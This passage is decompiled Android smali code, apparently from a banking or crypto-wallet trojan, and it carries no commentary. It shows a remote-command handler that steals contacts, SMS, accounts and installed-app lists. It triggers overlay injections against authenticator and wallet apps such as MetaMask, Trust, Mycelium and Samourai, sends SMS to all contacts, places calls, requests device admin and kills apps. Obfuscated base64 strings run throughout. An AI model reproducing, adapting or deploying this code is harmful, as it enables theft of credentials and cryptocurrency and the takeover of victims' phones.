    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v0, v2}, Ls0/c;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_e

    :cond_11
    move-object v3, v4

    move-object v4, v5

    const/4 v5, 0x1

    .line 19
    const-string v6, "getcontacts"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_12

    sget-object v0, Lh0/a;->a:Lh0/a;

    invoke-virtual {v0, v1}, Lh0/a;->i(Landroid/content/Context;)V

    goto/16 :goto_e

    :cond_12
    const-string v6, "getaccounts"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_13

    move v6, v5

    goto :goto_9

    :cond_13
    const-string v6, "logaccounts"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    :goto_9
    if-eqz v6, :cond_14

    sget-object v0, Lh0/a;->a:Lh0/a;

    invoke-virtual {v0, v1}, Lh0/a;->q(Landroid/content/Context;)V

    goto/16 :goto_e

    :cond_14
    const-string v6, "getinstallapps"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_15

    sget-object v0, Lh0/a;->a:Lh0/a;

    invoke-virtual {v0, v1}, Lh0/a;->g(Landroid/content/Context;)V

    goto/16 :goto_e

    :cond_15
    const-string v6, "getsms"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_16

    sget-object v0, Lh0/a;->a:Lh0/a;

    invoke-virtual {v0, v1}, Lh0/a;->n(Landroid/content/Context;)V

    goto/16 :goto_e

    :cond_16
    const-string v6, "startinject"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_17

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "app"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v1, v0}, Lh0/a;->r(Landroid/content/Context;Ljava/lang/String;)Z

    goto/16 :goto_e

    :cond_17
    const-string v6, "openurl"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    const-string v7, "context"

    if-eqz v6, :cond_19

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v2, "url"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "android.intent.action.VIEW"

    .line 20
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    :try_start_b
    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v5, "https://"

    const/4 v6, 0x2

    const/4 v7, 0x0

    invoke-static {v0, v5, v7, v6}, Ly0/f;->P(Ljava/lang/String;Ljava/lang/String;ZI)Z

    move-result v5

    if-nez v5, :cond_18

    const-string v5, "http://"

    invoke-static {v0, v5, v7, v6}, Ly0/f;->P(Ljava/lang/String;Ljava/lang/String;ZI)Z

    move-result v5

    if-nez v5, :cond_18

    const-string v5, "http://"

    invoke-static {v5, v0}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    :cond_18
    new-instance v5, Landroid/content/Intent;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-direct {v5, v2, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {v1, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    const-string v6, "openUrlBraw"

    const-string v7, "ok"

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v6, Lc0/b;->a:Lc0/b;

    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v7, "openUrlBraw"

    invoke-virtual {v6, v1, v4, v5, v7}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_2

    goto/16 :goto_e

    :catch_2
    new-instance v5, Landroid/content/Intent;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {v5, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    invoke-virtual {v5, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x40000000    # 2.0f

    invoke-virtual {v5, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x800000

    invoke-virtual {v5, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v2, 0x20000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "openUrlBraw"

    const-string v5, "ok"

    invoke-virtual {v0, v2, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v2, Lc0/b;->a:Lc0/b;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "openUrlBraw"

    invoke-virtual {v2, v1, v4, v0, v3}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_e

    .line 21
    :cond_19
    const-string v6, "startauthenticator2"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    const-string v8, "SDdEeDJMaHhWYWZPb0FScFozakRWZz09Ojo0V0QrdUNtZkxMUk04RmM3Q0dhbDVRPT0="

    if-eqz v6, :cond_1b

    const-string v0, "authenticator2"

    .line 22
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_1a

    const-string v2, "settings"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_1a
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 23
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "UkFzN0xnRE41YWEvZy9vM2pZNldReXZKb3lmdjZUOC81YTU5c1FPcFQ0Yys1Uk1HRk9DemlrSHNuV3AwdFBabTo6NHdsVVl2bmhQME9scCtScWpxUDRoZz09"

    goto/16 :goto_c

    :cond_1b
    const-string v6, "trust"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1d

    const-string v0, "trust"

    .line 24
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_1c

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_1c
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 25
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "UmRUblRpZERjd2s2N0Q5YXhEUkpyVExHL0NrWVk4aTY4aTd4Uzl0a3J4Zz06OkVWbHhZT1RtZnFKR2dWdHBYallJRVE9PQ=="

    goto/16 :goto_c

    :cond_1d
    const-string v6, "mycelium"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1f

    const-string v0, "mycelium"

    .line 26
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_1e

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_1e
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 27
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "T3ZLSHVGMmZ1aVA4c3RkVTlKZ3Z5V2V4THcwcDlKbnZYZG9VeXNsZ3duUT06OlVGcGx2d0hNSmE2QlpuV0FDalRYREE9PQ=="

    goto/16 :goto_c

    :cond_1f
    const-string v6, "piuk"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_21

    const-string v0, "piuk"

    .line 28
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_20

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_20
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 29
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "ckFSRU5MZFYzSzIvN2F6SU1QK3FyakUrTmZSLzN2QnM2UDl1dkZNQ0FjOD06OjV2ODYyOFc1eTc1MjlaKzJPM1AralE9PQ=="

    goto/16 :goto_c

    :cond_21
    const-string v6, "samourai"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_23

    const-string v0, "samourai"

    .line 30
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_22

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_22
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 31
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "R1BiNHd6bXNFRU5mdzhvSTdLNUUvV0ozZzNVRVp6ZEhKUmF4b2VVS1Nnbz06OklkYjFFeUd2YmFxQTM2OWFuRlV3bHc9PQ=="

    goto/16 :goto_c

    :cond_23
    const-string v6, "bitcoincom"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_25

    const-string v0, "bitcoincom"

    .line 32
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_24

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_24
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 33
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "a0QrdG9hRlRJTG9BaFRmczFZeUVWQVR4d1RDNkFQb1JqK1g1VEFRa016Yz06Om10ekcxN01pSHRENTJFbDF0ZXowZ3c9PQ=="

    goto/16 :goto_c

    :cond_25
    const-string v6, "toshi"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_27

    const-string v0, "toshi"

    .line 34
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_26

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_26
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 35
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "Zm1SVHI5aGo5VkJRbDR3czdwaWppQT09OjpnVWs5R1l3U2NCM1ZLZllucjlCU3hnPT0="

    goto/16 :goto_c

    :cond_27
    const-string v6, "metamask"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_29

    const-string v0, "metamask"

    .line 36
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_28

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    sput-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_28
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const/4 v3, 0x0

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 37
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "T3JycHpjS3VJR3NPcWlvMUdzSHRIQT09OjpRZnoyR0owalRsc21ZWXJ4QzNCcytRPT0="

    goto/16 :goto_c

    :cond_29
    const-string v6, "sendsmsall"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_2a

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "text"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "payload!!.getString(vucu\u2026JCR0ZjWmJmdXVlcE1nPT0=\"))"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v4, "sim"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "sim2"

    invoke-static {v0, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    invoke-virtual {v2, v1, v3, v0}, Lh0/a;->t(Landroid/content/Context;Ljava/lang/String;I)V

    goto/16 :goto_e

    :cond_2a
    const-string v6, "startapp"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_2b

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "app"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "payload!!.getString(vucu\u2026BzR0FoVlVvMkRUVmhBPT0=\"))"

    invoke-static {v0, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v2, v1, v0}, Lh0/a;->u(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_e

    :cond_2b
    const-string v6, "clearcash"

    invoke-static {v2, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_2c

    goto :goto_a

    :cond_2c
    const-string v5, "clearcache"

    invoke-static {v2, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    :goto_a
    if-eqz v5, :cond_2d

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "app"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v1, v0}, Lh0/a;->v(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_e

    :cond_2d
    const-string v5, "calling"

    invoke-static {v2, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2e

    sget-object v2, Lh0/a;->a:Lh0/a;

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "number"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "lock"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "1"

    invoke-static {v0, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    invoke-virtual {v2, v1, v3, v0}, Lh0/a;->a(Landroid/content/Context;Ljava/lang/String;Z)V

    goto/16 :goto_e

    :cond_2e
    const-string v5, "deleteapplication"

    invoke-static {v2, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    const-string v6, "OUVCY1Zob2JmQnl2N2lzSlpyRlBDZz09OjpRQ05XTE9tRk11dmpqamF5cUVmQjd3PT0="

    if-eqz v5, :cond_2f

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v2, "app"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v5, "payload!!.getString(vucu\u2026dYM3h2bFRCczl0aXV3PT0=\"))"

    invoke-static {v2, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 38
    sget-object v5, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v5}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    const-string v6, "killApplication"

    invoke-interface {v5, v6, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 39
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v5, "killApplication"

    const-string v6, "app"

    invoke-virtual {v0, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v0, Lc0/b;->a:Lc0/b;

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "killApplication"

    invoke-virtual {v0, v1, v4, v2, v3}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_e

    :cond_2f
    const-string v5, "startadmin"

    invoke-static {v2, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_30

    const-string v0, "1"

    .line 40
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v5, "start_admin"

    invoke-interface {v2, v5, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 41
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "startadmin"

    const-string v5, "ok"

    invoke-virtual {v0, v2, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v2, Lc0/b;->a:Lc0/b;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "TGRkQ0NkSmZvT3hER1N3b1ptLzMxQT09OjpURGlocUJWQzFSTmJJMkVxQ21rbk9BPT0="

    goto/16 :goto_b

    :cond_30
    const-string v5, "killme"

    invoke-static {v2, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_31

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    const-string v2, "context.packageName"

    invoke-static {v0, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 42
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-static {v6}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v2, v5, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 43
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "killme"

    const-string v5, "ok"

    invoke-virtual {v0, v2, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v2, Lc0/b;->a:Lc0/b;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "OVVSNDNqR0NUT1pGM0szalZYNUxwdz09OjpNcVFsaGZHRnRMbnFlMWJCRDZOdkR3PT0="

    goto :goto_b

    :cond_31
    const-string v5, "updateinjectandlistapps"

    invoke-static {v2, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_32

    const-string v0, "1"

    .line 44
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v5, "checkUpdateInjection"

    invoke-interface {v2, v5, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 45
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "updateinjectandlistapps"

    const-string v5, "ok"

